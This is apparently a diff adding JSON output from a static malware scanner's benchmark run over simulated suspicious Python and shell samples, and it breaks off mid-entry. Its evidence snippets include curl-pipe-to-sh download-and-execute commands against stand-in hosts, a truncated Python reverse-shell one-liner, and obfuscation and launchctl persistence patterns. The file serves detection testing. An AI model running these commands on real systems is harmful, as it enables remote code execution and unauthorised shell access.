+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -l https:\/\/evil.example.invalid\/payload.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-2889236311875990406",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -l https:\/\/evil.example.invalid\/payload.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4113867681801426485",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-3574377933605659601",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "5C27D1C3-A072-490C-9474-BFA1F403A4AB",
+    "sampleID" : "suspicious_python_downloader_sim_01"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "os.system(f'echo \"[dry-run][os.system] would run: {chain}\"')",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "dryRunOnly",
+        "explanation" : "Python 脚本调用 os.system 触发 shell 执行，具备命令注入与落地风险。",
+        "id" : "script|python.os_system|6|6|6157992110885080807",
+        "ruleID" : "python.os_system",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py",
+          "lineEnd" : 6,
+          "lineStart" : 6
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "os.system 命令执行"
+      },
+      {
+        "category" : "execution",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "subprocess.run([\"echo\", \"[dry-run][subprocess] would invoke staged shell chain\"], check=True)",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "dryRunOnly",
+        "explanation" : "检测到 subprocess.run\/call\/Popen，脚本可直接拉起外部二进制或 shell。",
+        "id" : "script|python.subprocess_exec|7|7|-3664511408066644999",
+        "ruleID" : "python.subprocess_exec",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py",
+          "lineEnd" : 7,
+          "lineStart" : 7
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "subprocess 外部进程执行"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|5048347646719074280",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|-8714543128362780906",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|5048347646719074280",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-8714543128362780906",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.os_system",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|2072838095474622082",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.subprocess_exec",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|7584112958049398004",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "215249C0-E4FB-4422-B7D5-8FEA8D7BDA2F",
+    "sampleID" : "suspicious_python_echo_chain_02"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|10|10|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_launchagent_mirror_02.py",
+          "lineEnd" : 10,
+          "lineStart" : 10
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_launchagent_mirror_02.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "intel.url.known_malicious_host",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4971587623526871332",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_launchagent_mirror_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "E2BFA084-385E-4E6C-B8E6-52309BE8AC1C",
+    "sampleID" : "suspicious_python_launchagent_mirror_02"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "import base64",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|2|2|-8783155294631834617",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "import marshal",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|3|3|1255889175743360416",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "import zlib",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|4|4|-940587829465307938",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "packed = marshal.dumps({\"msg\": harmless})",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|7|7|2887981296683275314",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 7,
+          "lineStart" : 7
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "compressed = zlib.compress(packed)",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|8|8|5785119006208755201",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "encoded = base64.b64encode(compressed)",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|9|9|-8445060196852269300",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 9,
+          "lineStart" : 9
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|11|11|6024783690875811169",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+          "lineEnd" : 11,
+          "lineStart" : 11
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-3574377933605659601",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "73BA3C75-91E0-4D2A-8231-0BC397A01125",
+    "sampleID" : "suspicious_python_obfuscation_restore_02"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python3 -c 'import socket,pty,os; ... pty.spawn",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-4006331473735813785",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 10,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python3 -c 'import socket,pty,os; ... pty.spawn(\\\"\/bin\/bash",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-2668267363698988525",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 10,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python3 -c 'import socket,pty,os; ... pty.spawn",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-4006331473735813785",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 10,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python3 -c 'import socket,pty,os; ... pty.spawn(\\\"\/bin\/bash",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-2668267363698988525",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 10,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py"
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "1DA232BE-9BD9-468C-9A49-C426BD0E8F0B",
+    "sampleID" : "suspicious_python_reverse_shell_string_02"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "network",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "CHAIN_CMD='curl -fsSL https:\/\/example.com\/install.sh | sh'",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "downloadExecuteLike",
+        "explanation" : "检测到 curl 输出直接通过管道进入 sh\/bash\/zsh，属于典型远程代码直接执行链。",
+        "id" : "script|shell.curl_pipe_sh|5|5|-662669220682854569",
+        "ruleID" : "shell.curl_pipe_sh",
+        "scoreDeltaBase" : 35,
+        "severity" : "critical",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "curl 下载后直接管道执行"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/install.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|4613461264221145993",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/install.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|2149375973047496105",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/install.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4613461264221145993",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/install.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|2149375973047496105",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "shell.curl_pipe_sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6625469277741867092",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "91550402-606C-49DF-BCA6-F36F08C01C93",
+    "sampleID" : "suspicious_shell_download_exec_string_02"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "persistence",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "echo \"[dry-run] launchctl load NOT invoked\"",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "dryRunOnly",
+        "explanation" : "脚本调用 launchctl load\/bootstrap，可能用于注册常驻项。",
+        "id" : "script|shell.launchctl.persistence|22|22|1277180210333570335",
+        "ruleID" : "shell.launchctl.persistence",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+          "lineEnd" : 22,
+          "lineStart" : 22
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "launchctl 持久化操作"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|11|11|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+          "lineEnd" : 11,
